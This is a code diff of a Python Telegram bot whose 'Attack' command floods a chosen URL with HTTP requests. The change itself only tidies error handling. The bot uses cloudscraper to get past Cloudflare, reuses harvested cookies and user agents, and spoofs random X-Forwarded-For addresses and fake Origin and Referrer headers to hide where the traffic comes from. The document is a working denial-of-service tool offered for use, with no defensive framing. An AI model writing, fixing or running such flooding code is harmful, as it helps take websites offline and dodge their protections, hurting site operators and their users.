@@ -4,7 +4,6 @@ import string
 import json
 from telegram import Update
 from telegram.ext import Updater, CommandHandler, CallbackContext
-
 from cloudscraper import create_scraper
 
 # Telegram bot token
@@ -28,29 +27,34 @@ def attack(update: Update, context: CallbackContext) -> None:
     for _ in range(time):
         try:
             response = scraper.get(url)
-            response_json = json.loads(response.text)
-            cookie = response_json["request"]["headers"]["cookie"]
-            useragent = response_json["request"]["headers"]["User-Agent"]
+            response_json = response.json()
 
-            rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
-            ip = '.'.join([random_byte() for _ in range(4)])
+            # Ensure all required keys are present in the JSON response
+            if "request" in response_json and "headers" in response_json["request"]:
+                cookie = response_json["request"]["headers"].get("cookie", "")
+                useragent = response_json["request"]["headers"].get("User-Agent", "")
 
-            headers = {
-                'User-Agent': useragent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                'Upgrade-Insecure-Requests': '1',
-                'cookie': cookie,
-                'Origin': f'http://{rand}.com',
-                'Referrer': f'http://google.com/{rand}',
-                'X-Forwarded-For': ip
-            }
+                rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+                ip = '.'.join([random_byte() for _ in range(4)])
 
-            requests.get(url, headers=headers)
+                headers = {
+                    'User-Agent': useragent,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Upgrade-Insecure-Requests': '1',
+                    'cookie': cookie,
+                    'Origin': f'http://{rand}.com',
+                    'Referrer': f'http://google.com/{rand}',
+                    'X-Forwarded-For': ip
+                }
+
+                requests.get(url, headers=headers)
+            else:
+                print("Required keys not found in JSON response")
         except Exception as e:
-            pass
+            print(f"An error occurred: {e}")
 
 def main():
-    updater = Updater(TOKEN)
+    updater = Updater(TOKEN, use_context=True)
     dispatcher = updater.dispatcher
     dispatcher.add_handler(CommandHandler("Attack", attack))
     updater.start_polling()
@@ -58,3 +62,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+                
